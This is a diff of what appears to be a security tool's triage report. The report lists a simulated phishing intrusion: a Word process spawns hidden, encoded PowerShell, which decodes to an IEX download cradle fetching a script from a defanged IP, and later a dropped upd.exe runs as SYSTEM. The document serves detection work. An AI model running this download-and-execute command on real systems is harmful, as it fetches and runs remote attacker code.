@@ -12,8 +12,7 @@ S1 · root OUTLOOK.EXE · ws-14.corp.example · CORP\jdoe · HIGH · 4 tactics �
    ── Execution ──
      3  10:02:05Z  ! winword.exe spawned cmd.exe cmd.exe /c powershell -nop -w hidden -enc 
 SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjA… [CMD-001, LIN-001]  T1204.002
-     4  10:02:05Z    cmd.exe decoded: IEX (New-Object 
-Net.WebClient).DownloadString('hxxp[://]203[.]0[.]113[.]10/a.ps1')
+     4  10:02:05Z    cmd.exe decoded: IEX (New-Object Net.WebClient).DownloadString('hxxp[://]203[.]0[.]113[.]10/a.ps1')
      5  10:02:06Z  ! cmd.exe spawned powershell.exe powershell -nop -w hidden -enc 
 SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA… [CMD-001, CMD-002]  T1059.001
      6  10:02:06Z    powershell.exe decoded: IEX (New-Object 
@@ -41,7 +40,7 @@ HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\Curr
  DNS         dl[.]example
              cdn[.]example
 
-S2 · root upd.exe · ws-14.corp.example · NT AUTHORITY\SYSTEM · MEDIUM · 2 tactics · 3 findings · 2026-10-12T11:00:00Z →
+S2 · root upd.exe · ws-14.corp.example · NT AUTHORITY\SYSTEM · MEDIUM · 2 tactics · 3 findings · 2026-10-12T11:00:00Z → 
 11:01:10Z (1m10s)
    ── Execution ──
      1  11:00:00Z  ! services.exe spawned upd.exe C:\Users\Public\upd.exe [GR-003, LOC-001]  T1105
